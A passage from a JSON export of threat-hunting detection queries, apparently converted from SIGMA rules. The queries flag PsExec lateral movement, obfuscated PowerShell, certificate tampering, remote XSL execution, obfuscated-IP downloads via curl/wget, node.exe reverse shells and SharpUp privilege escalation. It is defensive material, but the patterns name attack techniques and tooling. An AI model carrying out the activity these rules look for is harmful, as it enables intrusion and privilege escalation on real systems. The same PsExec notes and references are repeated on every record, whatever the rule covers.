tgt.process.cmdline contains \" \u2014i /s powershell\" or tgt.process.cmdline contains \" \u2014i \u2013s powershell\" or tgt.process.cmdline contains \" \u2014i \u2014s powershell\" or tgt.process.cmdline contains \" \u2014i \u2015s powershell\" or tgt.process.cmdline contains \" \u2015i -s powershell\" or tgt.process.cmdline contains \" \u2015i /s powershell\" or tgt.process.cmdline contains \" \u2015i \u2013s powershell\" or tgt.process.cmdline contains \" \u2015i \u2014s powershell\" or tgt.process.cmdline contains \" \u2015i \u2015s powershell\") and (tgt.process.cmdline contains \"psexec\" or tgt.process.cmdline contains \"paexec\" or tgt.process.cmdline contains \"accepteula\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 408
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated Powershell via use Clip.exe in Scripts",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation Via Use Clip",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline matches \"(?i)echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?)\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 409
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1553"
            ],
            "name": "Root Certificate Installed From Susp Locations",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Import-Certificate\" and tgt.process.cmdline contains \" -FilePath \" and tgt.process.cmdline contains \"Cert:\\LocalMachine\\Root\") and (tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \":\\Windows\\TEMP\\\" or tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Downloads\\\" or tgt.process.cmdline contains \"\\Perflogs\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 410
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1074"
            ],
            "name": "Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline=\"*Compress-Archive -Path*-DestinationPath $env:TEMP*\" or tgt.process.cmdline=\"*Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\*\" or tgt.process.cmdline=\"*Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\*\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 411
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the \"msxsl\" binary with an \"http\" keyword in the command line. This might indicate a potential remote execution of XSL files.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1220"
            ],
            "name": "Remote XSL Execution Via Msxsl.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\msxsl.exe\" and tgt.process.cmdline contains \"http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 412
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects ScreenConnect program starts that establish a remote access to a system.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1133"
            ],
            "name": "Remote Access Tool - ScreenConnect Installation Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"e=Access&\" and tgt.process.cmdline contains \"y=Guest&\" and tgt.process.cmdline contains \"&p=\" and tgt.process.cmdline contains \"&c=\" and tgt.process.cmdline contains \"&k=\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 413
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Suspect Svchost Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"svchost.exe\" and tgt.process.image.path contains \"\\svchost.exe\") and (not ((src.process.image.path contains \"\\rpcnet.exe\" or src.process.image.path contains \"\\rpcnetp.exe\") or not (tgt.process.cmdline matches \"\\.*\"))))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 414
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects binaries that use the same name as legitimate sysinternals tools to evade detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1202"
            ],
            "name": "Potential Binary Impersonating Sysinternals Tools",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\accesschk.exe\" or tgt.process.image.path contains \"\\accesschk64.exe\" or tgt.process.image.path contains \"\\AccessEnum.exe\" or tgt.process.image.path contains \"\\ADExplorer.exe\" or tgt.process.image.path contains \"\\ADExplorer64.exe\" or tgt.process.image.path contains \"\\ADInsight.exe\" or tgt.process.image.path contains \"\\ADInsight64.exe\" or tgt.process.image.path contains \"\\adrestore.exe\" or tgt.process.image.path contains \"\\adrestore64.exe\" or tgt.process.image.path contains \"\\Autologon.exe\" or tgt.process.image.path contains \"\\Autologon64.exe\" or tgt.process.image.path contains \"\\Autoruns.exe\" or tgt.process.image.path contains \"\\Autoruns64.exe\" or tgt.process.image.path contains \"\\autorunsc.exe\" or tgt.process.image.path contains \"\\autorunsc64.exe\" or tgt.process.image.path contains \"\\Bginfo.exe\" or tgt.process.image.path contains \"\\Bginfo64.exe\" or tgt.process.image.path contains \"\\Cacheset.exe\" or tgt.process.image.path contains \"\\Cacheset64.exe\" or tgt.process.image.path contains \"\\Clockres.exe\" or tgt.process.image.path contains \"\\Clockres64.exe\" or tgt.process.image.path contains \"\\Contig.exe\" or tgt.process.image.path contains \"\\Contig64.exe\" or tgt.process.image.path contains \"\\Coreinfo.exe\" or tgt.process.image.path contains \"\\Coreinfo64.exe\" or tgt.process.image.path contains \"\\CPUSTRES.EXE\" or tgt.process.image.path contains \"\\CPUSTRES64.EXE\" or tgt.process.image.path contains \"\\ctrl2cap.exe\" or tgt.process.image.path contains \"\\Dbgview.exe\" or tgt.process.image.path contains \"\\dbgview64.exe\" or tgt.process.image.path contains \"\\Desktops.exe\" or tgt.process.image.path contains \"\\Desktops64.exe\" or tgt.process.image.path contains \"\\disk2vhd.exe\" or tgt.process.image.path contains \"\\disk2vhd64.exe\" or tgt.process.image.path contains \"\\diskext.exe\" or tgt.process.image.path contains \"\\diskext64.exe\" or tgt.process.image.path contains \"\\Diskmon.exe\" or tgt.process.image.path contains \"\\Diskmon64.exe\" or tgt.process.image.path contains \"\\DiskView.exe\" or tgt.process.image.path contains \"\\DiskView64.exe\" or tgt.process.image.path contains \"\\du.exe\" or tgt.process.image.path contains \"\\du64.exe\" or tgt.process.image.path contains \"\\efsdump.exe\" or tgt.process.image.path contains \"\\FindLinks.exe\" or tgt.process.image.path contains \"\\FindLinks64.exe\" or tgt.process.image.path contains \"\\handle.exe\" or tgt.process.image.path contains \"\\handle64.exe\" or tgt.process.image.path contains \"\\hex2dec.exe\" or tgt.process.image.path contains \"\\hex2dec64.exe\" or tgt.process.image.path contains \"\\junction.exe\" or tgt.process.image.path contains \"\\junction64.exe\" or tgt.process.image.path contains \"\\ldmdump.exe\" or tgt.process.image.path contains \"\\listdlls.exe\" or tgt.process.image.path contains \"\\listdlls64.exe\" or tgt.process.image.path contains \"\\livekd.exe\" or tgt.process.image.path contains \"\\livekd64.exe\" or tgt.process.image.path contains \"\\loadOrd.exe\" or tgt.process.image.path contains \"\\loadOrd64.exe\" or tgt.process.image.path contains \"\\loadOrdC.exe\" or tgt.process.image.path contains \"\\loadOrdC64.exe\" or tgt.process.image.path contains \"\\logonsessions.exe\" or tgt.process.image.path contains \"\\logonsessions64.exe\" or tgt.process.image.path contains \"\\movefile.exe\" or tgt.process.image.path contains \"\\movefile64.exe\" or tgt.process.image.path contains \"\\notmyfault.exe\" or tgt.process.image.path contains \"\\notmyfault64.exe\" or tgt.process.image.path contains \"\\notmyfaultc.exe\" or tgt.process.image.path contains \"\\notmyfaultc64.exe\" or tgt.process.image.path contains \"\\ntfsinfo.exe\" or tgt.process.image.path contains \"\\ntfsinfo64.exe\" or tgt.process.image.path contains \"\\pendmoves.exe\" or tgt.process.image.path contains \"\\pendmoves64.exe\" or tgt.process.image.path contains \"\\pipelist.exe\" or tgt.process.image.path contains \"\\pipelist64.exe\" or tgt.process.image.path contains \"\\portmon.exe\" or tgt.process.image.path contains \"\\procdump.exe\" or tgt.process.image.path contains \"\\procdump64.exe\" or tgt.process.image.path contains \"\\procexp.exe\" or tgt.process.image.path contains \"\\procexp64.exe\" or tgt.process.image.path contains \"\\Procmon.exe\" or tgt.process.image.path contains \"\\Procmon64.exe\" or tgt.process.image.path contains \"\\psExec.exe\" or tgt.process.image.path contains \"\\psExec64.exe\" or tgt.process.image.path contains \"\\psfile.exe\" or tgt.process.image.path contains \"\\psfile64.exe\" or tgt.process.image.path contains \"\\psGetsid.exe\" or tgt.process.image.path contains \"\\psGetsid64.exe\" or tgt.process.image.path contains \"\\psInfo.exe\" or tgt.process.image.path contains \"\\psInfo64.exe\" or tgt.process.image.path contains \"\\pskill.exe\" or tgt.process.image.path contains \"\\pskill64.exe\" or tgt.process.image.path contains \"\\pslist.exe\" or tgt.process.image.path contains \"\\pslist64.exe\" or tgt.process.image.path contains \"\\psLoggedon.exe\" or tgt.process.image.path contains \"\\psLoggedon64.exe\" or tgt.process.image.path contains \"\\psloglist.exe\" or tgt.process.image.path contains \"\\psloglist64.exe\" or tgt.process.image.path contains \"\\pspasswd.exe\" or tgt.process.image.path contains \"\\pspasswd64.exe\" or tgt.process.image.path contains \"\\psping.exe\" or tgt.process.image.path contains \"\\psping64.exe\" or tgt.process.image.path contains \"\\psService.exe\" or tgt.process.image.path contains \"\\psService64.exe\" or tgt.process.image.path contains \"\\psshutdown.exe\" or tgt.process.image.path contains \"\\psshutdown64.exe\" or tgt.process.image.path contains \"\\pssuspend.exe\" or tgt.process.image.path contains \"\\pssuspend64.exe\" or tgt.process.image.path contains \"\\RAMMap.exe\" or tgt.process.image.path contains \"\\RDCMan.exe\" or tgt.process.image.path contains \"\\RegDelNull.exe\" or tgt.process.image.path contains \"\\RegDelNull64.exe\" or tgt.process.image.path contains \"\\regjump.exe\" or tgt.process.image.path contains \"\\ru.exe\" or tgt.process.image.path contains \"\\ru64.exe\" or tgt.process.image.path contains \"\\sdelete.exe\" or tgt.process.image.path contains \"\\sdelete64.exe\" or tgt.process.image.path contains \"\\ShareEnum.exe\" or tgt.process.image.path contains \"\\ShareEnum64.exe\" or tgt.process.image.path contains \"\\shellRunas.exe\" or tgt.process.image.path contains \"\\sigcheck.exe\" or tgt.process.image.path contains \"\\sigcheck64.exe\" or tgt.process.image.path contains \"\\streams.exe\" or tgt.process.image.path contains \"\\streams64.exe\" or tgt.process.image.path contains \"\\strings.exe\" or tgt.process.image.path contains \"\\strings64.exe\" or tgt.process.image.path contains \"\\sync.exe\" or tgt.process.image.path contains \"\\sync64.exe\" or tgt.process.image.path contains \"\\Sysmon.exe\" or tgt.process.image.path contains \"\\Sysmon64.exe\" or tgt.process.image.path contains \"\\tcpvcon.exe\" or tgt.process.image.path contains \"\\tcpvcon64.exe\" or tgt.process.image.path contains \"\\tcpview.exe\" or tgt.process.image.path contains \"\\tcpview64.exe\" or tgt.process.image.path contains \"\\Testlimit.exe\" or tgt.process.image.path contains \"\\Testlimit64.exe\" or tgt.process.image.path contains \"\\vmmap.exe\" or tgt.process.image.path contains \"\\vmmap64.exe\" or tgt.process.image.path contains \"\\Volumeid.exe\" or tgt.process.image.path contains \"\\Volumeid64.exe\" or tgt.process.image.path contains \"\\whois.exe\" or tgt.process.image.path contains \"\\whois64.exe\" or tgt.process.image.path contains \"\\Winobj.exe\" or tgt.process.image.path contains \"\\Winobj64.exe\" or tgt.process.image.path contains \"\\ZoomIt.exe\" or tgt.process.image.path contains \"\\ZoomIt64.exe\") and (not ((tgt.process.publisher in (\"Sysinternals - www.sysinternals.com\",\"Sysinternals\")) or not (tgt.process.publisher matches \"\\.*\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 415
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious process pattern which could be a sign of an exploited Serv-U service",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1555"
            ],
            "name": "Suspicious Serv-U Process Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\Serv-U.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 416
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects PowerShell script execution via input stream redirect",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Run PowerShell Script from Redirected Input Stream",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and tgt.process.cmdline matches \"\\\\s-\\\\s*<\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 417
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects use of an encoded/obfuscated version of an IP address (hex, octal...) in an URL combined with a download command",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Obfuscated IP Download Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Invoke-WebRequest\" or tgt.process.cmdline contains \"iwr \" or tgt.process.cmdline contains \"wget \" or tgt.process.cmdline contains \"curl \" or tgt.process.cmdline contains \"DownloadFile\" or tgt.process.cmdline contains \"DownloadString\") and ((tgt.process.cmdline contains \" 0x\" or tgt.process.cmdline contains \"//0x\" or tgt.process.cmdline contains \".0x\" or tgt.process.cmdline contains \".00x\") or (tgt.process.cmdline contains \"http://%\" and tgt.process.cmdline contains \"%2e\") or (tgt.process.cmdline matches \"https?://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.0[0-9]{3,4}\" or tgt.process.cmdline matches \"https?://[0-9]{1,3}\\\\.0[0-9]{3,7}\" or tgt.process.cmdline matches \"https?://0[0-9]{3,11}\" or tgt.process.cmdline matches \"https?://(0[0-9]{1,11}\\\\.){3}0[0-9]{1,11}\" or tgt.process.cmdline matches \"https?://0[0-9]{1,11}\" or tgt.process.cmdline matches \" [0-7]{7,13}\")) and (not tgt.process.cmdline matches \"https?://((25[0-5]|(2[0-4]|1\\\\d|[1-9])?\\\\d)(\\\\.|\\\\b)){4}\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 418
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "Potential Arbitrary Code Execution Via Node.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\node.exe\" and (tgt.process.cmdline contains \" -e \" or tgt.process.cmdline contains \" --eval \")) and (tgt.process.cmdline contains \".exec(\" and tgt.process.cmdline contains \"net.socket\" and tgt.process.cmdline contains \".connect\" and tgt.process.cmdline contains \"child_process\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 419
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of SharpUp, a tool for local privilege escalation",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1615",
                "t1569",
                "t1574"
            ],
            "name": "HackTool - SharpUp PrivEsc Tool Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\SharpUp.exe\" or tgt.process.displayName=\"SharpUp\" or (tgt.process.cmdline contains \"HijackablePaths\" or tgt.process.cmdline contains \"UnquotedServicePath\" or tgt.process.cmdline contains \"ProcessDLLHijack\" or tgt.process.cmdline contains \"ModifiableServiceBinaries\" or tgt.process.cmdline contains \"ModifiableScheduledTask\" or tgt.process.cmdline contains \"DomainGPPPassword\" or tgt.process.cmdline contains \"CachedGPPPassword\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
